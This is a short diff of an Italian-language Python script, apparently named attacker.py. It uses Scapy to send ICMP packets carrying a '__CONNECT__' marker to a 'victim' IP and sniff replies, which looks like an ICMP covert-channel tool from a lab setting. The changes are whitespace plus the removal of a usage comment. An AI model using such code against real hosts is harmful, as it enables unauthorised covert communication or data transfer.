@@ -165,6 +165,7 @@ def test_connection(ip_dst):
     global sniffer, timeout_timer
     if ip_vittima is None:
         raise Exception("IP della vittima sconosciuto")
+    
     print(f"Connessione con {ip_dst}...")
     pkt = IP(dst=ip_dst)/ICMP() / "".join( "__CONNECT__ {}".format(ip_vittima))
     ans = sr1(pkt, timeout=2, verbose=1)
@@ -183,7 +184,7 @@ def test_connection(ip_dst):
             sniffer.start()  
             timeout_timer.start()
             event.wait() 
-            if not sniffer.running:
+            if not sniffer.running: 
                 return False
             sniffer.stop()
             sniffer.join()
@@ -231,5 +232,3 @@ if __name__ == "__main__":
     for data in dati_separati:
         payload.append(unisciDati(data))
     print(payload)
-
-#py .\attacker.py --ip_vittima 192.168.56.101
